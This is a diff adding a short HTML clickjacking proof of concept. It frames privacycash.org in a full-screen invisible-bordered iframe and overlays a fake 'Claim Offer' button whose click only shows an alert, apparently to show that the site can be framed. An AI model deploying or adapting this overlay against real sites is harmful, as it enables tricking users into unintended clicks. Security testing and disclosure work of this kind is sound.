@@ -1,0 +1,11 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Clickjacking POC</title>
+<style>body,html{height:100%;margin:0}iframe{position:absolute;left:0;top:0;width:100vw;height:100vh;border:none}#fake-ui{position:absolute;right:20px;bottom:20px;z-index:9999;background:rgba(0,0,0,0.8);color:#fff;padding:12px;border-radius:8px;font-family:sans-serif}</style>
+</head>
+<body>
+<iframe src="https://privacycash.org/" id="target"></iframe>
+<div id="fake-ui"><p>Click for a special offer</p><button id="bait">Claim Offer</button></div>
+<script>document.getElementById('bait').addEventListener('click',()=>alert('Offer claimed!'))</script>
+</body>
+</html>
